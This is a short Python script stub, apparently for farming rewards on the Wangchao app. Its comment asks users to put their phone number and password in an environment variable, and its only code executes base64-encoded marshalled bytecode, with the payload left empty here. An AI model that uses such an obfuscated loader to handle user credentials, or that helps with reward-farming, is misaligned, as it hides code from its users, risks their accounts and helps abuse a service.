"""
望潮内部偷撸版
by MK
注册望潮然后改密码
环境变量wc
ck格式手机密码#手机号登陆便可

"""
import marshal,base64
exec(marshal.loads(base64.b64decode('')))